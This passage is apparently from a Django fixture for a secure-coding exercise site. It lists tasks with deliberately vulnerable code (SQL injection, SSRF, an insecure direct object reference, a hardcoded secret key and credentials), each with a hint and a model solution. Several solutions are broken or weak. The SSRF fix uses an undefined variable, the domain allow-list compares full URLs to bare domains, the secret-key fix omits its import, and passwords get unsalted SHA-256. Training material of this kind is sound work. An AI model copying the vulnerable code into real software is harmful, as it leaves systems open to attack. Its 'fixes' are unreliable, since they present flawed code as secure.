}\r\n\r\n    return 0;\r\n}", "hint": "Check user input", "vulnerability": 6, "key_words": "[\"#include <iostream>\", \"int main() {\", \"int arr[5] = {1\", \"2\", \"3\", \"4\", \"5};\", \"int index;\", \"std::cin >> index;\", \"std::cout << arr[index] << std::endl;\", \"return 0;\", \">=\", \"&&\", \"if\", \"<\"]", "lang": "c++", "gpt_questions": []}}, {"model": "coding.task", "pk": 35, "fields": {"name": "Login sqlite", "description": "Evaluate the login function, which is used to authenticate users to the system. Examine the implementation of the function to identify potential vulnerabilities related to the security of executing SQL queries. Develop proposals for code improvements to make it more secure against attacks such as SQL injection.", "slug": "login-sqlite", "code_task": "import sqlite3\r\n\r\ndef login(username, password):\r\n    connection = sqlite3.connect('users.db')\r\n    cursor = connection.cursor()\r\n\r\n    sql_query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\r\n    cursor.execute(sql_query)\r\n    result = cursor.fetchall()\r\n    connection.close()\r\n\r\n    if result:\r\n        return \"You have successfully logged in!\"\r\n    else:\r\n        return \"The username or password you entered is incorrect!\"", "solution": "#solution\r\nimport sqlite3\r\n\r\ndef login(username, password):\r\n    connection = sqlite3.connect('users.db')\r\n    cursor = connection.cursor()\r\n\r\n    sql_query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\r\n    cursor.execute(sql_query, (username, password))\r\n    result = cursor.fetchall()\r\n    connection.close()\r\n\r\n    if result:\r\n        return \"You have successfully logged in!\"\r\n    else:\r\n        return \"The username or password you entered is incorrect!\"", "hint": "Use parameterized queries to replace directly inserting variable values into the query string, thereby avoiding the risk of SQL injection.", "vulnerability": 7, "key_words": "[\"import sqlite3\", \"def login(username\", \"password):\", \"SELECT * FROM users WHERE username = ? AND password = ?\", \"if result:\", \"return \\\"You have successfully logged in!\\\"\", \"return \\\"The username or password you entered is incorrect!\\\"\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 36, "fields": {"name": "Secure region data", "description": "Create a Flask endpoint that fetches data from a server based on the region specified in the request parameters. If the region is \"EU\", use the subdomain \"europe\"; otherwise, use \"world\". Ensure that the subdomain is securely controlled by the server to prevent SSRF attacks. Implement logic to handle cases where the target parameter is missing, defaulting to \"world\". Make sure the implementation is clear and avoids using user input directly for subdomain formation.", "slug": "secure-region-data", "code_task": "from flask import Flask, request\r\nimport requests\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/get_data_by_region\")\r\ndef get_data_by_region():\r\n    subdomain = request.args[\"target\"]\r\n\r\n    resp = requests.get(\"https://\" + subdomain + \".example.com/data/\")\r\n    return resp.content\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)", "solution": "from flask import Flask, request\r\nimport requests\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/get_data_by_region\")\r\ndef get_data_by_region():\r\n    subdomain = request.args[\"target\"]\r\n\r\n    subdomain = \"europe\" if target == \"EU\" else \"world\"\r\n    resp = requests.get(\"https://\" + subdomain + \".example.com/data/\")\r\n    return resp.content\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)", "hint": "Ensure the subdomain is set based on a predefined condition, using \"europe\" for \"EU\" and \"world\" otherwise, without directly incorporating user input into the URL.", "vulnerability": 4, "key_words": "[\"from flask import Flask\", \"request\", \"import requests\", \"app = Flask(__name__)\", \"@app.route(\\\"/get_data_by_region\\\")\", \"def get_data_by_region():\", \"subdomain = request.args[\\\"target\\\"]\", \"if target\", \"==\", \"EU\", \"else\", \"world\", \"resp = requests.get(\\\"https://\\\" + subdomain + \\\".example.com/data/\\\")\", \"if __name__ == \\\"__main__\\\":\", \"app.run(debug=True)\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 37, "fields": {"name": "User info by id", "description": "In this task, you are required to identify and fix a security vulnerability in the given Flask application code. The vulnerability arises from directly using user input in a URL, which can lead to injection attacks. Your task is to validate the user_id parameter to ensure it is a numerical value before making the external API request. To achieve this, implement a method in Python that checks if the user_id consists only of digits. Once validated, the application should safely use the user_id in the API request.", "slug": "user-info-by-id", "code_task": "import requests\r\nfrom flask import Flask, request\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/get_by_id\")\r\ndef get_by_id():\r\n    user_id = request.args[\"user_id\"]\r\n\r\n    resp = requests.get(\"https://api.example.com/user_info/\" + user_id)\r\n\r\n    return resp.text", "solution": "import requests\r\nfrom flask import Flask, request\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/get_by_id\")\r\ndef get_by_id():\r\n    user_id = request.args[\"user_id\"]\r\n\r\n    if user_id.isalnum():\r\n        resp = requests.get(\"https://api.example.com/user_info/\" + user_id)\r\n        return resp.text\r\n    else:\r\n        return \"Invalid user_id\", 400", "hint": "Use isalnum() for checking id.", "vulnerability": 4, "key_words": "[\"import requests\", \"from flask import Flask\", \"request\", \"@app.route(\\\"/get_by_id\\\")\", \"def get_by_id():\", \"user_id = request.args[\\\"user_id\\\"]\", \"if\", \"user_id.isalnum\", \"resp = requests.get(\\\"https://api.example.com/user_info/\\\" + user_id)\", \"return resp.text\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 38, "fields": {"name": "Allowed domains", "description": "The task involves improving the security of a Flask web application by addressing a potential vulnerability. The current code retrieves content from a URL specified via a request parameter without any domain validation, which can be exploited for SSRF attacks. Your task is to introduce a constant, ALLOWED_DOMAINS, containing example.com and api.example.com. You must then implement a check to ensure that the provided URL's domain is in the ALLOWED_DOMAINS list before making the request.", "slug": "allowed-domains", "code_task": "import requests\r\nfrom flask import Flask, request\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route(\"/domain_request\")\r\ndef domain_request():\r\n    url = request.args.get(\"url\")\r\n    \r\n    resp = requests.get(url)\r\n\r\n    return resp.content", "solution": "import requests\r\nfrom flask import Flask, request, abort\r\n\r\napp = Flask(__name__)\r\n\r\nALLOWED_DOMAINS = [\"example.com\", \"api.example.com\"]\r\n\r\n@app.route(\"/domain_request\")\r\ndef domain_request():\r\n    url = request.args.get(\"url\")\r\n\r\n    if url not in ALLOWED_DOMAINS:\r\n        abort(400, \"URL is not allowed\")\r\n\r\n    resp = requests.get(url)\r\n    \r\n    return resp.content\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(debug=True)", "hint": "To implement the check, split the provided URL to extract the domain and verify if it is within the ALLOWED_DOMAINS list before making the request.", "vulnerability": 4, "key_words": "[\"import requests\", \"from flask import Flask\", \"request\", \"app = Flask(__name__)\", \"ALLOWED_DOMAINS\", \"example.com\", \"api.example.com\", \"@app.route(\\\"/domain_request\\\")\", \"def domain_request():\", \"url = request.args.get(\\\"url\\\")\", \"if\", \"not in ALLOWED_DOMAINS\", \"resp = requests.get(url)\", \"return resp.content\", \"if __name__ == \\\"__main__\\\":\", \"app.run(debug=True)\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 39, "fields": {"name": "Django 404", "description": "You've been given Django view code to display article details by article_id. Analyze the code and find potential vulnerabilities. Pay attention to how input data and interactions with the database are processed to identify possible problems.", "slug": "django404", "code_task": "from django.shortcuts import render\r\nfrom .models import Article\r\n\r\n\r\ndef article_detail(request, article_id):\r\n    article = Article.objects.filter(id=article_id).first()\r\n    return render(request, \"article_detail.html\", {\"article\": article})", "solution": "from django.shortcuts import render, get_object_or_404\r\nfrom .models import Article\r\n\r\n\r\ndef article_detail(request, article_id):\r\n    article = get_object_or_404(Article, id=article_id)\r\n    return render(request, \"article_detail.html\", {\"article\": article})", "hint": "To increase security and improve code performance, replace the use of the filter and first method with get with DoesNotExist exception handling, and also add a 404 error return if the article is not found.", "vulnerability": 8, "key_words": "[\"from django.shortcuts import render\", \"get_object_or_404\", \"from .models import Article\", \"def article_detail(request\", \"article_id):\", \"get_object_or_404\", \"Article\", \"id\", \"article_id\", \"return render(request\", \"\\\"article_detail.html\\\"\", \"{\\\"article\\\": article})\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 40, "fields": {"name": "Secret key", "description": "The task involves addressing a security vulnerability in the provided Django settings code. The current configuration exposes sensitive information, posing a significant security risk. The objective is to refactor the code to securely load sensitive data from environment variables. This enhancement will protect the application from potential attacks and unauthorized access.", "slug": "secret-key", "code_task": "from pathlib import Path\r\n\r\nBASE_DIR = Path(__file__).resolve().parent.parent\r\n\r\nSECRET_KEY = \"django-insecure-@brre211up6q#7%gzi#l%p3(mzvsddd28%$b@7vwrcv4zq1\"", "solution": "from pathlib import Path\r\n\r\nBASE_DIR = Path(__file__).resolve().parent.parent\r\n\r\nSECRET_KEY = os.environ.get(\"DJANGO_SECRET_KEY\")", "hint": "Use os.environ.get to get DJANGO_SECRET_KEY from environmental variables.", "vulnerability": 8, "key_words": "[\"from pathlib import Path\", \"BASE_DIR = Path(__file__).resolve().parent.parent\", \"os.environ.get\", \"DJANGO_SECRET_KEY\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 41, "fields": {"name": "Task editor", "description": "Your task is to locate a vulnerability within the given Django code snippet. Write a concise description outlining the objective in English, spanning five sentences. Hint towards utilizing the 'request' object to identify the vulnerability, without disclosing additional details. The vulnerability may involve improper user authorization or data validation. Your analysis should focus on assessing the security implications of the code and suggesting potential improvements to mitigate any identified risks.", "slug": "task-editor", "code_task": "from django.shortcuts import get_object_or_404, redirect, render\r\nfrom django.contrib.auth.decorators import login_required\r\nfrom .models import Task\r\nfrom .forms import TaskForm\r\n\r\n@login_required\r\ndef edit_task(request, task_id):\r\n    task = get_object_or_404(Task, id=task_id)\r\n    if request.method == 'POST':\r\n        form = TaskForm(request.POST, instance=task)\r\n        if form.is_valid():\r\n            form.save()\r\n            return redirect('task_list')\r\n    else:\r\n        form = TaskForm(instance=task)\r\n    return render(request, 'edit_task.html', {'form': form})", "solution": "from django.shortcuts import get_object_or_404, redirect, render\r\nfrom django.contrib.auth.decorators import login_required\r\nfrom .models import Task\r\nfrom .forms import TaskForm\r\n\r\n@login_required\r\ndef edit_task(request, task_id):\r\n    task = get_object_or_404(Task, id=task_id, user=request.user)\r\n    if request.method == 'POST':\r\n        form = TaskForm(request.POST, instance=task)\r\n        if form.is_valid():\r\n            form.save()\r\n            return redirect('task_list')\r\n    else:\r\n        form = TaskForm(instance=task)\r\n    return render(request, 'edit_task.html', {'form': form})", "hint": "Compare request.user with user in database", "vulnerability": 8, "key_words": "[\"from django.shortcuts import get_object_or_404\", \"redirect\", \"render\", \"from django.contrib.auth.decorators import login_required\", \"from .models import Task\", \"from .forms import TaskForm\", \"@login_required\", \"def edit_task(request\", \"task_id):\", \"if request.method == 'POST':\", \"form = TaskForm(request.POST\", \"instance=task)\", \"form = TaskForm(instance=task)\", \"return render(request\", \"'edit_task.html'\", \"{'form': form})\", \"user=request.user\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 42, "fields": {"name": "iframe not allowed", "description": "Add the necessary configuration settings to the server block in your Nginx configuration file to prevent clickjacking vulnerabilities. The configuration should ensure that the site cannot be embedded in an iframe. Provide instructions on how to apply the changes and confirm they are effective.", "slug": "iframe-not-allowed", "code_task": "server {\r\n    listen 80;\r\n    server_name example.com;\r\n\r\n    root /var/www/html;\r\n    index index.html index.htm;\r\n}", "solution": "server {\r\n    listen 80;\r\n    server_name example.com;\r\n\r\n    root /var/www/html;\r\n    index index.html index.htm;\r\n\r\n    add_header X-Frame-Options \"DENY\";\r\n}", "hint": "Use X-Frame-Options header", "vulnerability": 5, "key_words": "[\"server {\", \"listen 80;\", \"server_name example.com;\", \"index index.html index.htm;\", \"root /var/www/html;\", \"add_header X-Frame-Options\", \"\\\"DENY\\\"\"]", "lang": "nginx", "gpt_questions": []}}, {"model": "coding.task", "pk": 43, "fields": {"name": "Forms iframe", "description": "Identify and fix the security vulnerability in the provided HTML code. The current implementation uses an iframe to embed content from an external source without proper restrictions. Ensure that the embedded content cannot perform potentially harmful actions, such as form submission or script execution, that could compromise security. Update the code to include the necessary security measures while maintaining the functionality of the embedded form.", "slug": "forms-iframe", "code_task": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Page</title>\r\n</head>\r\n<body>\r\n    <h1>New form</h1>\r\n    <iframe \r\n        src=\"https://www.submit-form.com/\" \r\n        width=\"600\" \r\n        height=\"400\"\r\n        title=\"Example Iframe\">\r\n    </iframe>\r\n</body>\r\n</html>", "solution": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Page</title>\r\n</head>\r\n<body>\r\n    <h1>New form</h1>\r\n    <iframe \r\n        src=\"https://www.submit-form.com/\" \r\n        sandbox=\"allow-forms allow-modals\"\r\n        width=\"600\" \r\n        height=\"400\"\r\n        title=\"Example Iframe\">\r\n    </iframe>\r\n</body>\r\n</html>", "hint": "Use sandbox attribute to set restrictions.", "vulnerability": 5, "key_words": "[\"<!DOCTYPE html>\", \"<html lang=\\\"en\\\">\", \"<head>\", \"<meta charset=\\\"UTF-8\\\">\", \"<meta name=\\\"viewport\\\" content=\\\"width=device-width\", \"initial-scale=1.0\\\">\", \"<title>Page</title>\", \"</head>\", \"sandbox\", \"allow-forms\", \"allow-modals\", \"height=\\\"400\\\"\", \"<iframe\", \"</iframe>\", \"</html>\"]", "lang": "html", "gpt_questions": []}}, {"model": "coding.task", "pk": 44, "fields": {"name": "Admin access", "description": "Your task is to identify and fix the security vulnerability in the provided Python code related to hardcoded credentials. Refactor the code to ensure that sensitive information like usernames and passwords is not hardcoded and can be securely managed. The solution should enhance the security of the authentication process without compromising functionality. Provide a brief explanation of the changes made and how they improve security.", "slug": "admin-access", "code_task": "username = \"admin\"\r\npassword = \"password123\"\r\n\r\ndef authenticate(user, pwd):\r\n    if user == username and pwd == password:\r\n        return \"Authenticated\"\r\n    else:\r\n        return \"Authentication Failed\"\r\n\r\nprint(authenticate(\"admin\", \"password123\"))", "solution": "import os\r\n\r\nusername = os.getenv(\"APP_USERNAME\")\r\npassword = os.getenv(\"APP_PASSWORD\")\r\n\r\ndef authenticate(user, pwd):\r\n    if user == username and pwd == password:\r\n        return \"Authenticated\"\r\n    else:\r\n        return \"Authentication Failed\"\r\n\r\nprint(authenticate(os.getenv(\"TEST_USER\"), os.getenv(\"TEST_PASS\")))", "hint": "Load credentials from environmental variables os.getenv.", "vulnerability": 7, "key_words": "[\"def authenticate(user\", \"pwd):\", \"if user\", \"pwd\", \"return \\\"Authenticated\\\"\", \"else:\", \"return \\\"Authentication Failed\\\"\", \"os.getenv\", \"print(authenticate(os.getenv\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 45, "fields": {"name": "Account deposit", "description": "In this assignment, you are provided with a Python class Account that handles basic account operations such as deposit and withdrawal. There is a vulnerability in the code that needs to be addressed to ensure proper account management. Your task is to identify and fix this vulnerability so that the class functions correctly. Please provide the corrected code.", "slug": "account-deposit", "code_task": "class Account:\r\n    def __init__(self, balance):\r\n        self.balance = balance\r\n\r\n    def deposit(self, amount):\r\n        self.balance += amount\r\n        print(f'Deposited {amount}, new balance is {self.balance}')\r\n\r\n    def withdraw(self, amount):\r\n        self.balance -= amount\r\n        print(f'Withdrew {amount}, new balance is {self.balance}')\r\n\r\nuser_account = Account(100)\r\n\r\nuser_account.deposit(50)\r\n\r\nuser_account.withdraw(200)", "solution": "class Account:\r\n    def __init__(self, balance):\r\n        self.balance = balance\r\n\r\n    def deposit(self, amount):\r\n        self.balance += amount\r\n        print(f'Deposited {amount}, new balance is {self.balance}')\r\n\r\n    def withdraw(self, amount):\r\n        if self.balance >= amount:\r\n            self.balance -= amount\r\n            print(f'Withdrew {amount}, new balance is {self.balance}')\r\n        else:\r\n            print(f'Insufficient funds: cannot withdraw {amount}, balance is {self.balance}')\r\n\r\nuser_account = Account(100)\r\n\r\nuser_account.deposit(50)\r\n\r\nuser_account.withdraw(200)", "hint": "Ensure that the withdraw method prevents operations that would result in a negative balance.", "vulnerability": 8, "key_words": "[\"class Account:\", \"def __init__(self\", \"balance):\", \"self.balance = balance\", \"def deposit(self\", \"amount):\", \"self.balance += amount\", \"print(f'Deposited {amount}\", \"new balance is {self.balance}')\", \"def withdraw(self\", \"amount):\", \"if self.balance >= amount:\", \"self.balance -= amount\", \"user_account = Account(100)\", \"user_account.deposit(50)\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.task", "pk": 46, "fields": {"name": "Allowed domains iframe", "description": "Modify the Nginx configuration to prevent the usage of iframes except from the domain https://example.com. Ensure the appropriate headers are added to enforce this restriction. Update the configuration for both the root and /images/ locations.", "slug": "allowed-domains-iframe", "code_task": "server {\r\n    location / {\r\n        proxy_pass http://localhost:8080;\r\n    }\r\n\r\n    location /images/ {\r\n        root /data;\r\n    }\r\n}", "solution": "server {\r\n    location / {\r\n        proxy_pass http://localhost:8080;\r\n        add_header X-Frame-Options \"ALLOW-FROM https://example.com\";\r\n    }\r\n\r\n    location /images/ {\r\n        root /data;\r\n        add_header X-Frame-Options \"ALLOW-FROM https://example.com\";\r\n    }\r\n}", "hint": "Use X-Frame-Options ALLOW-FROM settings.", "vulnerability": 5, "key_words": "[\"server {\", \"location / {\", \"proxy_pass http://localhost:8080;\", \"add_header X-Frame-Options\", \"ALLOW-FROM\", \"https://example.com\", \"location /images/ {\", \"}\"]", "lang": "nginx", "gpt_questions": []}}, {"model": "coding.task", "pk": 47, "fields": {"name": "New user", "description": "In this task, you are presented with the code for a user registration function in a system that uses an SQLite database to store user information. The register_user function takes two arguments: username and password. Your task is to analyze this code for potential security vulnerabilities.", "slug": "new-user", "code_task": "import hashlib\r\nimport sqlite3\r\n\r\n\r\ndef register_user(username, password):\r\n    conn = sqlite3.connect(\"users.db\")\r\n    cursor = conn.cursor()\r\n    \r\n    cursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,))\r\n    if cursor.fetchone() is not None:\r\n        print(\"Username already exists.\")\r\n        conn.close()\r\n        return False\r\n    \r\n\r\n    cursor.execute(\"INSERT INTO users (username, password) VALUES (?, ?)\", (username, password))\r\n    conn.commit()\r\n    conn.close()\r\n    print(\"User registered successfully.\")", "solution": "import hashlib\r\nimport sqlite3\r\n\r\n\r\ndef hash_password(password):\r\n    return hashlib.sha256(password.encode()).hexdigest()\r\n\r\n\r\ndef register_user(username, password):\r\n    conn = sqlite3.connect(\"users.db\")\r\n    cursor = conn.cursor()\r\n    \r\n    cursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,))\r\n    if cursor.fetchone() is not None:\r\n        print(\"Username already exists.\")\r\n        conn.close()\r\n        return False\r\n    \r\n\r\n    hashed_password = hash_password(password)\r\n    cursor.execute(\"INSERT INTO users (username, password) VALUES (?, ?)\", (username, hashed_password))\r\n    conn.commit()\r\n    conn.close()\r\n    print(\"User registered successfully.\")", "hint": "Use hashlib library to hash password.", "vulnerability": 7, "key_words": "[\"import hashlib\", \"import sqlite3\", \"def register_user(username\", \"password):\", \"conn = sqlite3.connect(\\\"users.db\\\")\", \"cursor = conn.cursor()\", \"cursor.execute(\\\"SELECT * FROM users WHERE username = ?\\\"\", \"(username\", \"))\", \"if cursor.fetchone() is not None:\", \"if cursor.fetchone() is not None:\", \"cursor.execute(\\\"INSERT INTO users (username\", \"password) VALUES (?\", \"?)\\\"\", \"(username\", \"conn.commit()\", \"print(\\\"User registered successfully.\\\")\", \"encode()\"]", "lang": "python", "gpt_questions": []}}, {"model": "coding.solvedtask", "pk": 11, "fields": {"user": 1, "task": 17}}, {"model": "coding.solvedtask", "pk": 12, "fields": {"user": 1, "task": 18}}, {"model": "coding.solvedtask", "pk": 13, "fields": {"user": 1, "task": 24}}, {"model": "coding.solvedtask", "pk": 14, "fields": {"user": 1, "task": 27}}, {"model": "coding.solvedtask", "pk": 15, "fields": {"user": 1, "task": 28}}, {"model": "coding.solvedtask", "pk": 16, "fields": {"user": 1, "task": 29}}, {"model": "coding.solvedtask", "pk": 17, "fields": {"user": 1, "task": 31}}, {"model": "coding.solvedtask", "pk": 18, "fields": {"user": 1, "task": 32}}, {"model": "coding.solvedtask", "pk": 19, "fields": {"user": 1, "task": 33}}, {"model": "coding.solvedtask", "pk": 20, "fields": {"user": 1, "task": 34}}, {"model": "coding.solvedtask", "pk": 21, "fields": {"user": 1, "task": 36}}, {"model": "coding.solvedtask", "pk": 22, "fields": {"user": 1, "task": 37}}, {"model": "coding.solvedtask", "pk": 23, "fields": {"user": 1, "task": 38}}, {"model": "coding.solvedtask", "pk": 24, "fields": {"user": 1, "task": 39}}, {"model": "coding.solvedtask", "pk": 25, "fields": {"user": 1, "task": 40}}, {"model": "coding.solvedtask", "pk": 26, "fields": {"user": 1, "task": 42}}, {"model": "coding.solvedtask", "pk": 27, "fields": {"user": 1, "task": 43}}, {"model": "coding.solvedtask", "pk": 28, "fields": {"user": 1, "task": 45}}, {"model": "coding.solvedtask", "pk": 29, "fields": {"user": 1, "task": 46}}, {"model": "coding.solvedtask", "pk": 30, "fields": {"user": 1, "task": 47}}, {"model": "coding.solvedtask", "pk": 31, "fields": {"user": 1, "task": 20}}, {"model": "coding.solvedtask", "pk": 32, "fields": {"user": 1, "task": 21}}]
